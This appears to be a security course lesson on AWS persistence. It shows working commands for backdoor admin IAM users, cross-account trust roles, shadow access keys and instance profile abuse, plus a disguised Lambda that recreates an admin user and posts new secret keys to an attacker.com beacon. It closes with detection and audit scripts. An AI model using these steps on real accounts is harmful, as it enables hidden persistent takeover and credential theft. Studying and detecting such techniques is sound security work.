---
title: "Cloud Persistence Techniques — Backdoor IAM, Cross-Account Roles, Lambda Backdoor"
tags: [cloud-persistence, AWS, IAM, backdoor, cross-account, Lambda, shadow-credentials,
       ATT&CK-T1136.003, ATT&CK-T1098, ATT&CK-T1098.001, cloud-exploitation,
       post-exploitation]
module: 04-BroadSurface-02
day: 191
related_topics:
  - IAM Misconfiguration Attacks (Day 183)
  - Lambda and Serverless Attacks (Day 187)
  - Cloud Full Attack Lab (Day 192)
  - Detecting Cloud Attacks (Day 194)
  - Cloud Hardening (Day 195)
---

# Day 191 — Cloud Persistence Techniques

> "Getting in is one problem. Staying in is another. Cloud environments rotate
> temporary credentials automatically — the IMDS token you stole expires in an
> hour. Persistence means planting something that survives the next credential
> rotation, the next incident response, and the next policy audit. A well-placed
> backdoor IAM user with a long-lived key is invisible until someone reads the
> entire user list and notices the account created at 3 AM on a Saturday."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Create a backdoor IAM user with a long-lived access key and admin access.
2. Plant a cross-account role that allows re-entry from an attacker-controlled
   AWS account.
3. Deploy a Lambda function as a persistent backdoor that exfiltrates
   credentials or executes commands.
4. Add shadow credentials to an existing role (key rotation without detection).
5. Identify and remove cloud persistence artefacts as a defender.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| IAM misconfiguration attacks | Day 183 |
| Lambda and serverless attacks | Day 187 |
| AWS CLI and IAM permissions | Day 182 |

---

## Part 1 — Backdoor IAM User

The simplest and most common cloud persistence technique: create a new IAM
user with admin access and a long-lived access key.

```bash
# Step 1: Create a low-profile backdoor user
aws iam create-user --user-name support-automation-svc

# Step 2: Attach AdministratorAccess
aws iam attach-user-policy \
  --user-name support-automation-svc \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 3: Create a long-lived access key
aws iam create-access-key --user-name support-automation-svc
# → AccessKeyId: AKIAIOSFODNN7EXAMPLE
# → SecretAccessKey: wJalrXUtnFEMI/...

# Save and use from attacker machine
aws configure --profile backdoor
# Enter the key above
aws iam list-users --profile backdoor   # Confirm admin access
```

**Evasion techniques:**
- Use a name that blends with service accounts: `ops-bot`, `deploy-svc`, `automation-user`
- Create the user inside a less-monitored child account in an Organisation
- Set a tag that mimics a known service: `"Purpose": "CI/CD pipeline integration"`

---

## Part 2 — Cross-Account Backdoor Role

Plant a role in the target account with a trust policy pointing to the
attacker's external AWS account. This persists even if the initial access
vector is closed — as long as the role exists, the attacker can re-enter.

```bash
# Step 1: Create a role in the target account with cross-account trust
cat > trust-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::999999999999:root"
    },
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": {
        "sts:ExternalId": "backdoor-external-id-abc123"
      }
    }
  }]
}
EOF

aws iam create-role \
  --role-name BackupSyncRole \
  --assume-role-policy-document file://trust-policy.json \
  --description "Used for backup synchronisation tasks"

# Step 2: Attach admin access to the role
aws iam attach-role-policy \
  --role-name BackupSyncRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 3: From attacker's account (999999999999): assume the backdoor role
aws sts assume-role \
  --role-arn arn:aws:iam::TARGET_ACCOUNT_ID:role/BackupSyncRole \
  --role-session-name reentry-session \
  --external-id backdoor-external-id-abc123
```

**This is the most durable persistence technique.** It survives:
- Compromise of the original access vector (SSRF fixed)
- Rotation of all EC2 instance credentials
- Incident response that does not specifically look for cross-account roles

---

## Part 3 — Lambda Backdoor

A Lambda function scheduled to run periodically can: exfiltrate data,
beacon back to an attacker server, or create new access keys when the
existing ones are detected.

```python
# backdoor_lambda.py — scheduled credential rotation beacon
import boto3, requests, os, json
from datetime import datetime

def handler(event, context):
    """
    Runs every 12 hours via EventBridge scheduler.
    Creates a new access key for the backdoor user if the old one is
    detected and rotated.
    Exfiltrates current IAM credentials to attacker C2.
    """
    iam = boto3.client("iam")
    c2_url = os.environ.get("C2_URL", "https://attacker.com/beacon")

    # Ensure backdoor user exists
    try:
        iam.get_user(UserName="support-automation-svc")
    except iam.exceptions.NoSuchEntityException:
        # Recreate if deleted
        iam.create_user(UserName="support-automation-svc")
        iam.attach_user_policy(
            UserName="support-automation-svc",
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
        )

    # Check existing keys
    keys = iam.list_access_keys(UserName="support-automation-svc")
    if len(keys["AccessKeyMetadata"]) == 0:
        # Create a new key and exfiltrate
        new_key = iam.create_access_key(UserName="support-automation-svc")
        payload = {
            "timestamp": datetime.utcnow().isoformat(),
            "access_key_id": new_key["AccessKey"]["AccessKeyId"],
            "secret_access_key": new_key["AccessKey"]["SecretAccessKey"],
        }
        try:
            requests.post(c2_url, json=payload, timeout=5)
        except Exception:
            pass   # Fail silently

    return {"status": "ok"}
```

```bash
# Deploy the Lambda backdoor
zip backdoor.zip backdoor_lambda.py

aws lambda create-function \
  --function-name HealthCheckScheduler \
  --runtime python3.11 \
  --role arn:aws:iam::123456789012:role/lambda-execution-role \
  --handler backdoor_lambda.handler \
  --zip-file fileb://backdoor.zip \
  --environment Variables="{C2_URL=https://attacker.com/beacon}" \
  --description "Scheduled health monitoring function"

# Create an EventBridge rule to trigger every 12 hours
aws events put-rule \
  --name HealthCheckScheduler-trigger \
  --schedule-expression "rate(12 hours)" \
  --state ENABLED

aws lambda add-permission \
  --function-name HealthCheckScheduler \
  --statement-id events-invoke \
  --action lambda:InvokeFunction \
  --principal events.amazonaws.com \
  --source-arn arn:aws:events:us-east-1:123456789012:rule/HealthCheckScheduler-trigger

aws events put-targets \
  --rule HealthCheckScheduler-trigger \
  --targets Id=1,Arn=arn:aws:lambda:us-east-1:123456789012:function:HealthCheckScheduler
```

---

## Part 4 — Shadow IAM Credentials (Key Addition Without Rotation)

Instead of creating a new user, add a second access key to an existing
compromised user. This is harder to detect than a new user.

```bash
# List existing keys for a compromised user
aws iam list-access-keys --user-name alice

# Add a second key (IAM allows max 2 active keys per user)
aws iam create-access-key --user-name alice
# → Returns a second set of credentials
# → Alice's original key still works
# → Both keys have equal access

# Defensive implication: even if the incident response team rotates
# alice's known key, the second (shadow) key is still active unless
# the team lists ALL keys for ALL users
```

---

## Part 5 — Backdoor EC2 Instance Profile

Attach a high-privilege instance profile to a running EC2 instance to
escalate the instance's IAM permissions without touching IAM users:

```bash
# Find existing instances
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].{ID:InstanceId,Profile:IamInstanceProfile.Arn}'

# Create a new instance profile with admin role
aws iam create-instance-profile --instance-profile-name AdminAccessProfile
aws iam add-role-to-instance-profile \
  --instance-profile-name AdminAccessProfile \
  --role-name AdminRole

# Associate with a running instance (replaces existing profile)
aws ec2 associate-iam-instance-profile \
  --instance-id i-0abcdef1234567890 \
  --iam-instance-profile Name=AdminAccessProfile

# The instance's IMDS now returns admin credentials
# Any application running on the instance has admin access
```

---

## Part 6 — Detecting and Removing Cloud Persistence

### Defender Checklist

```bash
# 1. Audit all IAM users — look for recently created accounts
aws iam list-users | jq '.Users[] | {User: .UserName, Created: .CreateDate}' \
  | sort -k2

# 2. List ALL access keys across ALL users (shadow keys)
for user in $(aws iam list-users | jq -r '.Users[].UserName'); do
  keys=$(aws iam list-access-keys --user-name $user \
    | jq -r '.AccessKeyMetadata[] | "\(.AccessKeyId) \(.Status) \(.CreateDate)"')
  if [ -n "$keys" ]; then
    echo "User: $user"
    echo "$keys"
  fi
done

# 3. Audit cross-account trust relationships on all roles
for role in $(aws iam list-roles | jq -r '.Roles[].RoleName'); do
  trust=$(aws iam get-role --role-name $role \
    | jq '.Role.AssumeRolePolicyDocument.Statement[] | select(.Principal.AWS) | .Principal.AWS')
  if [ -n "$trust" ]; then
    echo "Role: $role"
    echo "Trusted principals: $trust"
  fi
done

# 4. Find Lambda functions with EventBridge schedules
aws events list-rules | jq '.Rules[] | {Name: .Name, Schedule: .ScheduleExpression}'
aws events list-targets-by-rule --rule RULE_NAME

# 5. Check for Lambda functions created recently
aws lambda list-functions \
  | jq '.Functions[] | {Name: .FunctionName, Modified: .LastModified}' \
  | sort -k4
```

### CloudTrail Detection Queries

```bash
# Find IAM user creation events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateUser \
  | jq '.Events[] | {Time: .EventTime, User: .Username, NewUser: .CloudTrailEvent}'

# Find new access key creation
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey \
  | jq '.Events[]'

# Find cross-account role assumptions
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  | jq '.Events[] | select(.CloudTrailEvent | fromjson | .userIdentity.accountId != "123456789012")'
```

---

## Key Takeaways

1. **IAM backdoor users are low-tech but highly effective.** A user named
   `ops-automation` created at 3 AM with `AdministratorAccess` is invisible
   until someone audits user creation timestamps. Always monitor
   `iam:CreateUser` and `iam:CreateAccessKey` in CloudTrail.
2. **Cross-account backdoor roles survive most incident response procedures.**
   IR teams rotate credentials and patch the initial access vector. They
   rarely audit cross-account trust relationships. This makes cross-account
   roles the most durable persistence mechanism.
3. **Lambda backdoors are operationally deceptive.** A function named
   `HealthCheckScheduler` running on a 12-hour schedule looks exactly like
   a legitimate monitoring task. Audit all EventBridge-triggered Lambdas.
4. **Shadow access keys are the IR team's nightmare.** All incident response
   for stolen AWS credentials must enumerate and revoke ALL access keys for
   ALL users — not just the compromised user's known key.
5. **CloudTrail is the forensic record for cloud persistence.** Every IAM
   API call — user creation, key creation, role modification, cross-account
   assumption — appears in CloudTrail. Set up alerts on these events, or
   the attacker has permanent access until the next manual audit.

---

## Exercises

1. On LocalStack: implement the full backdoor chain: create a backdoor user,
   attach admin access, generate a key, and assume a cross-account role using
   that key. Document each CloudTrail event generated.
2. Write an incident response script in Python that: lists all IAM users
   created in the last 7 days, lists all access keys created in the last 7
   days (across all users), and lists all roles with cross-account trust
   policies. Output a formatted report.
3. Deploy the Lambda backdoor from Part 3 on LocalStack with an EventBridge
   trigger. Confirm it fires on schedule. Then write the detection: a Sigma
   rule that fires when a Lambda function with a schedule trigger is created
   outside of business hours.
4. Research: what is AWS IAM Identity Center (formerly SSO)? How does its
   use of short-lived permission sets make traditional IAM user backdoors
   less effective? What new persistence techniques emerge in SSO-based
   environments?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q191.1, Q191.2 …).
> Follow-up questions use hierarchical numbering (Q191.1.1, Q191.1.2 …).

---

## Navigation

← Previous: [Day 190 — GCP for Attackers](DAY-0190-GCP-for-Attackers.md)
→ Next: [Day 192 — Cloud Full Attack Lab](DAY-0192-Cloud-Full-Attack-Lab.md)
